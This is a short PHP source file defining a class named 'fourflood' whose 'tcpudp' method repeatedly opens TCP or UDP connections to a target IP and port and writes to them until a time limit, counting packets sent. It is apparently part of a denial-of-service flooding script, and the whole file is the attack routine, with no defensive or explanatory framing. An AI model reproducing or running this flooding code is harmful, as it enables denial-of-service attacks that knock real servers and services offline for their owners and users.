<?php
class fourflood{
	function tcpudp($ip, $port, $timedout, $starttime, $method, $lenght, $max_time, $exec_time){
		while(1){
			try{
			$packets++; 
						if(time() > $max_time){
							output($packets, $starttime, $exec_time, $lenght);
							break; 
						}
				$fp = fsockopen("$method://".$ip, $port, $errno, $errstr, $timedout); 
				fwrite($fp, $out); 
				fclose($fp);
			}catch (Exception $e){
				echo $e;
			}
		}
	}
}
?>